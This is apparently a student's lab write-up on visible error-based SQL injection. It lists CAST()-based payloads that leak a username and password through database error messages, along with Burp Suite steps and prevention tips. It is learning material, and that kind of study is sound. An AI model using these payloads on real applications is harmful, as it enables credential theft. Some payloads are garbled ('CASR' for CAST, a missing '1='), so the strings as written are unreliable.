# 🔐 Lab 13: Visible Error-Based SQL Injection

## 🧩 Objective
Exploit SQL injection to retrieve the admininstrator credentilas and login as a admininstrator.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection and displays detailed database error messages, allowing attackers to extract data directly from errors.

## ⚙️ Payload Used
- ' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
- ' AND 1=CASR((SELECT password from users LIMIT 1) as int)--

## 🔎 Analysis
1. Use CAST() to force database type conversion
2. ATTEMPT to convert text data into integer
3. Databse throws errors including the text value
4. Extract sensitive data directly from error messeage

## 🚀 Steps to Reproduce
1. Navigate to the vulnerable page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater  
4. Inject payload:
   ' AND CAST((SELECT username FROM users LIMIT 1) AS int)--  
5. Observe error message displaying username  
6. Extract password using:
   ' AND 1=CASR((SELECT password from users LIMIT 1) as int)--  
7. Observe error message containing password  

## ✅ Result
Successfully extracted sensitive data(Username and password) directly from database error message.

## 🧠 Key Learning
Visible error based sql injection allows direct data extraction without blind techniques by abusing database error messages.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Disable detailed database error messages  
- Implement proper error handling  
- Validate and sanitize user input  

---

## 📸 Screenshots

<img width="1360" height="689" alt="LAB13_1" src="https://github.com/user-attachments/assets/79376123-c4a1-42a2-a8a5-5767646a9c1f" />
<br><br>

**Figure 1: Error message displaying extracted username**

<br><br>

<img width="1363" height="687" alt="LAB13_2" src="https://github.com/user-attachments/assets/8ec162a0-a984-4915-b615-1423b9eeee6a" />
<br><br>

**Figure 2: Extracting administrator password using error-based payload**

<br><br>

<img width="1356" height="673" alt="LAB13_3" src="https://github.com/user-attachments/assets/b73aa569-db6d-49a0-97e1-f8b45b345cd9" />
<br><br>

**Figure 3: Successfully logged in as a administrator by using user credentials (Lab Solved)**
